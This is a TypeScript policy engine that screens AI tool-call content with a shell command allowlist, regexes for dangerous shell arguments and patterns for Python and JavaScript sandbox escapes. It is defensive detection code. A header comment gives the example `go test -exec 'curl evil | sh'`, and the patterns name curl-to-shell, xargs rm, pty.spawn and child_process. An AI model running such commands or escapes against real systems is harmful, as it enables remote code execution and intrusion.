// SPDX-License-Identifier: Apache-2.0

/**
 * Tool Shell / Code Execution Policy Engine.
 *
 * Handles three policy types:
 *
 * ── command-allowlist ────────────────────────────────────────────────────────
 * Permits only explicitly listed shell commands. Any command not in the
 * allowlist triggers a detection. Prefer allowlists over blocklists — the
 * shell attack surface is too large to enumerate.
 *
 * Config:
 *   allowedCommands: string[]  — permitted base command names (e.g. ["ls","cat"])
 *   label?: string             — default: 'command-blocked'
 *
 * ── argument-injection ───────────────────────────────────────────────────────
 * Detects dangerous shell argument patterns even when the base command is
 * allowed. Catches techniques like `go test -exec 'curl evil | sh'`, subshell
 * expansion `$(...)`, pipe-to-shell, ANSI injection, etc.
 *
 * Config:
 *   extraPatterns?: string[]  — additional regex patterns to flag
 *   label?: string            — default: 'argument-injection'
 *
 * ── sandbox-escape ────────────────────────────────────────────────────────────
 * Detects language-level sandbox escape patterns in code tool arguments.
 * Covers Python (subprocess, os.system, eval, pickle) and JavaScript
 * (child_process, eval, Function constructor, require('fs')).
 *
 * Config:
 *   language?: 'python' | 'javascript' | 'any'  — default: 'any'
 *   label?: string                               — default: 'sandbox-escape'
 */

import { safeRegex } from './builtin-engine';
import type {
  PolicyDetection,
  PolicyEngine,
  PolicyEvalContext,
} from './policy-evaluator-types';

// ─── shell-command-allowlist ───────────────────────────────────────────────────

/** Extract the first token of a shell command (the base command name). */
const COMMAND_PATTERN = /(?:^|[\n;|&`$(])\s*([a-zA-Z0-9._/-]+)/gm;

function evaluateShellCommandAllowlist(
  ctx: PolicyEvalContext,
): PolicyDetection[] {
  const cfg = ctx.binding.config || {};
  const label = (cfg.label as string) || 'command-blocked';
  const allowedCommands = (cfg.allowedCommands as string[]) || [];

  if (allowedCommands.length === 0) return []; // No allowlist configured — skip

  const detections: PolicyDetection[] = [];
  const allowed = new Set(allowedCommands.map((c) => c.toLowerCase()));

  for (const match of ctx.content.matchAll(COMMAND_PATTERN)) {
    const raw = match[1];
    // Extract basename (strip leading path)
    const cmd = raw.split('/').pop()?.toLowerCase() ?? '';
    if (cmd && !allowed.has(cmd)) {
      const idx = (match.index ?? 0) + match[0].indexOf(raw);
      detections.push({
        type: label,
        confidence: 0.9,
        message: `Command not in allowlist: ${cmd}`,
        spans: [{ start: idx, end: idx + raw.length }],
      });
    }
  }

  return detections;
}

// ─── shell-argument-injection ─────────────────────────────────────────────────

/** Built-in dangerous argument patterns. */
const DANGEROUS_ARG_PATTERNS: ReadonlyArray<{ re: RegExp; msg: string }> = [
  { re: /--exec\s+['"`]?[^'"`\s]/, msg: '--exec flag with payload' },
  { re: /-exec\s+[^;]+;/, msg: 'find -exec shell injection' },
  { re: /\$\([^)]+\)/, msg: 'subshell expansion $()' },
  { re: /`[^`]+`/, msg: 'backtick subshell expansion' },
  { re: /\|\s*(?:sh|bash|zsh|dash|ksh)\b/, msg: 'pipe to shell' },
  { re: /\|\s*(?:python3?|perl|ruby|node)\b/i, msg: 'pipe to interpreter' },
  { re: /xargs\s+(?:sh|bash|rm|curl|wget)/i, msg: 'xargs with shell/rm/curl' },
  { re: /\beval\s+['"`$]/, msg: 'eval with dynamic argument' },
  { re: /curl\s+.*\|\s*(?:sh|bash)/i, msg: 'curl-pipe-shell pattern' },
  { re: /wget\s+.*-O\s*-\s*\|/i, msg: 'wget pipe pattern' },
  // biome-ignore lint/suspicious/noControlCharactersInRegex: intentional — detecting ANSI terminal escape injection
  { re: /\x1b\[[0-9;]*[a-zA-Z]/, msg: 'ANSI escape sequence injection' },
  { re: /\0/, msg: 'null byte injection' },
];

function evaluateShellArgumentInjection(
  ctx: PolicyEvalContext,
): PolicyDetection[] {
  const cfg = ctx.binding.config || {};
  const label = (cfg.label as string) || 'argument-injection';
  const extraPatterns = (cfg.extraPatterns as string[]) || [];

  const detections: PolicyDetection[] = [];

  for (const { re, msg } of DANGEROUS_ARG_PATTERNS) {
    const match = re.exec(ctx.content);
    if (match) {
      const idx = match.index ?? 0;
      detections.push({
        type: label,
        confidence: 0.95,
        message: `Dangerous shell argument: ${msg}`,
        spans: [{ start: idx, end: idx + match[0].length }],
      });
    }
  }

  for (const patternStr of extraPatterns) {
    const re = safeRegex(patternStr);
    if (re) {
      const match = re.exec(ctx.content);
      if (match) {
        const idx = match.index ?? 0;
        detections.push({
          type: label,
          confidence: 0.85,
          message: 'Custom dangerous argument pattern matched',
          spans: [{ start: idx, end: idx + match[0].length }],
        });
      }
    } else {
      // Skip invalid regex
    }
  }

  return detections;
}

// ─── code-sandbox-escape ─────────────────────────────────────────────────────

const PYTHON_ESCAPE_PATTERNS: ReadonlyArray<{ re: RegExp; msg: string }> = [
  {
    re: /\bsubprocess\s*\.\s*(?:run|call|Popen|check_output|check_call)/i,
    msg: 'subprocess usage',
  },
  {
    re: /\bos\s*\.\s*(?:system|popen|execv|execve|execl|spawnl|spawnv)/i,
    msg: 'os shell execution',
  },
  { re: /\beval\s*\(/i, msg: 'eval() call' },
  { re: /\bexec\s*\(/i, msg: 'exec() call' },
  { re: /\b__import__\s*\(/i, msg: '__import__() dynamic import' },
  { re: /\bpickle\s*\.\s*loads?\s*\(/i, msg: 'pickle deserialization' },
  { re: /\bmarshal\s*\.\s*loads?\s*\(/i, msg: 'marshal deserialization' },
  { re: /\bctypes\b/, msg: 'ctypes (native code bridge)' },
  { re: /\bpty\s*\.\s*spawn/i, msg: 'pty.spawn shell escape' },
  { re: /\bimportlib\s*\.\s*import_module/i, msg: 'dynamic importlib usage' },
];

const JAVASCRIPT_ESCAPE_PATTERNS: ReadonlyArray<{ re: RegExp; msg: string }> = [
  { re: /\beval\s*\(/, msg: 'eval() call' },
  { re: /\bnew\s+Function\s*\(/, msg: 'Function constructor' },
  {
    re: /require\s*\(\s*['"`](?:child_process|fs|os|path|vm|cluster)['"`]\s*\)/,
    msg: 'dangerous require()',
  },
  { re: /\bchild_process\b/, msg: 'child_process module' },
  {
    re: /process\s*\.\s*(?:exit|kill|env|binding)/i,
    msg: 'process object access',
  },
  {
    re: /\bvm\s*\.\s*(?:runInNewContext|runInThisContext|Script)/i,
    msg: 'vm module execution',
  },
  { re: /\bwasm\b.*\binstantiate/i, msg: 'WebAssembly instantiation' },
];

function evaluateCodeSandboxEscape(ctx: PolicyEvalContext): PolicyDetection[] {
  const cfg = ctx.binding.config || {};
  const label = (cfg.label as string) || 'sandbox-escape';
  const language = (cfg.language as string) || 'any';

  const detections: PolicyDetection[] = [];

  const checkPython = language === 'python' || language === 'any';
  const checkJs = language === 'javascript' || language === 'any';

  const patternsToCheck: Array<{ re: RegExp; msg: string }> = [
    ...(checkPython ? PYTHON_ESCAPE_PATTERNS : []),
    ...(checkJs ? JAVASCRIPT_ESCAPE_PATTERNS : []),
  ];

  for (const { re, msg } of patternsToCheck) {
    const match = re.exec(ctx.content);
    if (match) {
      const idx = match.index ?? 0;
      detections.push({
        type: label,
        confidence: 0.95,
        message: `Code sandbox escape attempt: ${msg}`,
        spans: [{ start: idx, end: idx + match[0].length }],
      });
    }
  }

  return detections;
}

// ─── Engine class ─────────────────────────────────────────────────────────────

export class PolicyShellEngine implements PolicyEngine {
  readonly name = 'policy-shell-engine';

  evaluate(ctx: PolicyEvalContext): PolicyDetection[] {
    switch (ctx.binding.policyType) {
      case 'command-allowlist':
        return evaluateShellCommandAllowlist(ctx);
      case 'argument-injection':
        return evaluateShellArgumentInjection(ctx);
      case 'sandbox-escape':
        return evaluateCodeSandboxEscape(ctx);
      default:
        return [];
    }
  }
}
